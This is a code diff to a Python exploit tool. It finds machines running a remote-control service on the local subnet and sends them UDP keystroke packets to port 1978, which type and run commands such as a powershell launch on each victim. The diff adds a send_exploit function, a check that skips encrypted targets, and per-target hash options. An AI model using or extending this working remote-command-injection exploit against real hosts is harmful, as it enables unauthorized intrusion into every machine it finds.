@@ -160,13 +160,20 @@ def parse_cmd(s: str) -> list:
     :rtype: list
     """
     pkts = []
-    special_codes = []
-    for m in re.finditer(re_keycodes, s):
-        match = m.group()
-        s = s.replace(match, '{}')
-        keycodes = match[1:-1].split('+')
-        special_codes += [special2pkt]
-    
+    for tok in re.split(re_keycodes, s): # Split the command string into "tokens" (basically text by itself, but things in square brackets in their own element)
+        if not (tok.startswith('[') and tok.endswith(']')): # if it's just a plain substring, not a special command
+            pkts += [char2pkt(c) for c in tok] # Add the individual character packets
+            continue
+        
+        
+        if '+' in tok: # If it's a combo special command
+            cmds = tok[1:-1].split('+') # Split the command on the +
+            parsed_cmds = [Keycodes[cmd] if cmd in Keycodes.__members__ else cmd for cmd in cmds] # Convert the necessary commands into keycodes
+            pkts.append(combo2pkt(parsed_cmds[-1], parsed_cmds[:-1])) # Create the command packet
+            continue
+        
+        pkts.append(special2pkt(Keycodes[tok[1:-1]])) # Otherwise it's an individual command, just convert it and add
+
     return pkts
 
 
@@ -177,7 +184,7 @@ def discover_targets() -> list:
     :return: List of IP Addresses
     :rtype: list
     """
-    _info("Listening to UDP port 2007 until SIGINT is sent...")
+    _info("Listening to UDP port 2007 until SIGINT...")
     targets = []
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('0.0.0.0', 2007))
@@ -191,21 +198,55 @@ def discover_targets() -> list:
             
             targets.append(ip)
             _success("Received broadcast from {} ({})".format(ip, host))
+    
     except KeyboardInterrupt:
         pass
+    
     finally:
         return targets
+    
 
+def send_exploit(pkts: list, target_ip: str, key: str = '') -> None:
+    """
+    Sends the exploit across the wire
+
+    :param pkts: List of strings containing the packet data to send to victim
+    :type pkts: list
+    :param target_ip: IP Addr of the victim
+    :type pkts: str
+    :param key: Hash to prepend
+    :type key: str
+    """
+    _info("Sending exploit to {}".format(target_ip))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    for pkt in pkts:
+        time.sleep(0.08)
+        _info("Sending '{}'".format(pkt))
+        sock.sendto(key.encode('utf-8') + pkt.encode('utf-8'), (target_ip, 1978))
+
+
+def target_encrypted(target_ip: str) -> bool:
+    """
+    Checks if the target is using encryption
+
+    :param target_ip: Target IP running the server
+    :type target_ip: str
+    :return: True or false
+    :rtype: bool
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, 1978))
+    return b'pwd pwd' in s.recv(1024)
 
 
 def main():
-    print(discover_targets())
-    return
     parser = argparse.ArgumentParser()
     parser.add_argument('--os', type=str, action='store', choices=('MacOS', 'Windows'), required=True, help="Signals what OS the target is running")
     parser.add_argument('--cmd', type=str, action='store', required=True, help="Command to execute")
     # parser.add_argument('--troll', type=str, action='store', choices=('delete',), help="Adds what trolling features you want to implement")
     parser.add_argument('--targets', type=str, action='store', default='-', help="Comma delimited list of targets, '-' if you want to target all IP addresses on the subnet")
+    parser.add_argument('--hashes', type=str, action='store', default='', help="Comma delimited list of hashes that line up with the targets")
+    parser.add_argument('--skip-encrypted', action='store_true', default=True, help="Skip the encrypted targets")
     args = parser.parse_args()
 
     if args.os == 'MacOS':
@@ -214,16 +255,23 @@ def main():
     if args.targets == '-':
         args.targets = discover_targets()
     else:
-        args.targets = args.target.split(',')
+        args.targets = args.targets.split(',')
+    
+    args.hashes = args.hashes.split(',')
+    if args.hashes != [''] and len(args.hashes) != len(args.targets):
+        raise ValueError("Number of hashes does not equal number of targets")
 
+    cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
+    time.sleep(5)
     for target in args.targets:
+        if args.skip_encrypted and target_encrypted(target):
+            _info("Skipping {} because of encryption".format(target))
+            continue
         _info("Executing '{}' against {} running on {}".format(args.cmd, target, args.os))
-        cmd_pkts = parse_cmd(args.cmd) # parse_cmd("[WIN+R]powershell.exe[ENTER]{}[ENTER]".format(cmd))
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        for pkt in cmd_pkts:
-            time.sleep(0.08)
-            _info("Sending '{}'".format(pkt))
-            sock.sendto(pkt.encode('utf-8'), (target, 1978))
+        send_exploit(cmd_pkts, target)
+        
+        
+        
 
 
 if __name__ == "__main__":
